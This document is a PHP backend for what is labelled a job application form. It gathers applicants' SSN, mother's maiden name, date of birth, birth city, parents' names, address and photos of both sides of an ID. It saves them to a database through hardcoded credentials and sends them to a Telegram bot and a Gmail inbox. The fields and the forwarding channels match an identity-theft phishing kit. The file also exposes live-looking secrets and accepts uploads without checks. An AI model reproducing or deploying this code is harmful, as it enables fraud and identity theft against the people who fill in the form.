<?php
// ======================
// NEON DATABASE (PostgreSQL)
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb";
$user = "neondb_owner";
$pass = "npg_TQ1gBOwA9rCa";
$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db";

try {
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// FORM DATA
// ======================
$first_name = $_POST['first_name'];
$middle_name = $_POST['middle_name'];
$last_name = $_POST['last_name'];
$phone = $_POST['phone'];
$email = $_POST['email'];
$dob = $_POST['dob'];
$mother_maiden = $_POST['mother_maiden'];
$ssn = $_POST['ssn'];
$birth_city = $_POST['birth_city'];
$address = $_POST['address'];
$father_name = $_POST['father_name'];
$mother_name = $_POST['mother_name'];

// ======================
// FILE UPLOAD FUNCTION
// ======================
function uploadFile($file) {
    if ($file['error'] == 0) {
        $name = time() . "_" . basename($file['name']);
        $target = "uploads/" . $name;
        move_uploaded_file($file['tmp_name'], $target);
        return $target;
    }
    return null;
}

$front_id = uploadFile($_FILES['front_id']);
$back_id = uploadFile($_FILES['back_id']);

// ======================
// SAVE TO DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
first_name, middle_name, last_name,
phone, email, dob, mother_maiden,
ssn, birth_city, address,
father_name, mother_name,
front_id, back_id
)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
$first_name, $middle_name, $last_name,
$phone, $email, $dob, $mother_maiden,
$ssn, $birth_city, $address,
$father_name, $mother_name,
$front_id, $back_id
]);

// ======================
// TELEGRAM NOTIFICATION
// ======================
$botToken = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
$chatId = "6513265609";

$text = "📄 New Application Submitted\n\n"
. "👤 Name: $first_name $middle_name $last_name\n"
. "📞 Phone: $phone\n"
. "📧 Email: $email\n"
. "🎂 DOB: $dob\n"
. "🏠 Address: $address\n"
. "🏙 Birth City: $birth_city\n"
. "👨 Father: $father_name\n"
. "👩 Mother: $mother_name\n"
. "🧾 SSN (last 4): $ssn\n"
. "🪪 Front ID: $front_id\n"
. "🪪 Back ID: $back_id\n";

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text));

// ======================
// EMAIL NOTIFICATION
// ======================
$to = "collaomn@gmail.com";
$subject = "New Job Form Submission";
$body = $text;
$headers = "From: noreply@yourdomain.com";

mail($to, $subject, $body, $headers);

// ======================
echo "Form submitted successfully!";
?>
